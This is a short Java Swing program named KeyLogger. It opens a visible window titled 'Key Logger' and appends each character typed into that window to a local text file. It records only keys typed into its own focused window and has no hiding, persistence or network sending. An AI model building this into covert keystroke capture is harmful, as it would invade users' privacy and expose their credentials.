import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import javax.swing.JFrame;
import java.io.FileWriter;
import java.io.IOException;

public class KeyLogger extends JFrame implements KeyListener {
    private static final String LOG_FILE = "key_log.txt";

    public KeyLogger() {
        // Configure the JFrame
        setTitle("Key Logger");
        setSize(400, 200);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        addKeyListener(this);
        setVisible(true);
    }

    @Override
    public void keyTyped(KeyEvent e) {
        logKey(e.getKeyChar());
    }

    @Override
    public void keyPressed(KeyEvent e) {
        // Optional: Handle key press events
    }

    @Override
    public void keyReleased(KeyEvent e) {
        // Optional: Handle key release events
    }

    private void logKey(char keyChar) {
        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {
            writer.write(keyChar);
            writer.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        new KeyLogger();
    }
}
